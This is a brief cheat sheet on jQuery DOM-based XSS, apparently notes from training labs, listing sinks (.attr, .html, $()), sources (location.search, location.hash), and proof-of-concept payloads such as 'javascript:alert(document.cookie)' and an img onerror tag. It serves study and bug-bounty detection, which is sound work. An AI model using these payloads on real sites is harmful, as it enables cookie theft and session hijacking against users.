# jQuery DOM XSS CheatSheet

## Common jQuery Sinks

### .attr()

```javascript
.attr(
"href",
userInput
)
```

---

### .html()

```javascript
.html(
userInput
)
```

---

### $()

```javascript
$(userInput)
```

---

# Lab06

## Source

```javascript
location.search
```

---

## Sink

```javascript
.attr()
```

---

## Payload

```javascript
javascript:alert(document.cookie)
```

---

# Lab07

## Source

```javascript
location.hash
```

---

## Sink

```javascript
$()
```

---

## Payload

```html
<img src=x onerror=print()>
```

---

# Detection Workflow

```text
location.*
        ↓
jQuery Function
        ↓
Execution
```

---

# Bug Bounty Indicators

Look for:

```javascript
$(
location.hash
)

.attr(
"href"
)

.html(
location.search
)
```

These frequently lead to DOM XSS.